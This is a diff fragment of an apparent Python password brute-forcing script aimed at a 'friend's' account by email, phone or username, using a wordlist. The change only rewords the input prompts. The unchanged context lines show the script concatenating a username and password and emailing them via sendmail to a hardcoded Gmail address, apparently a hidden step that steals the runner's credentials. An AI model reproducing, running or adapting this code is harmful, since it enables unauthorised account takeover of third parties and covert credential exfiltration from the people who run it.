@@ -12,8 +12,8 @@ msg =username+password
 server.sendmail("karloslikres@gmail.com", "20xxismailxx19@gmail.com", msg)
 server.quit()
 
-email = str(raw_input("# Enter |Email| |Phone number| |Profile ID number| |Username| of your friend: "))
-passwordlist = str(raw_input("Enter the name of the password list file : "))
+email = str(raw_input(" Enter ID or Email or Phone number or Username of your friend: "))
+passwordlist = str(raw_input("Enter the link&name of the wordlist file : "))
 
 useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
 
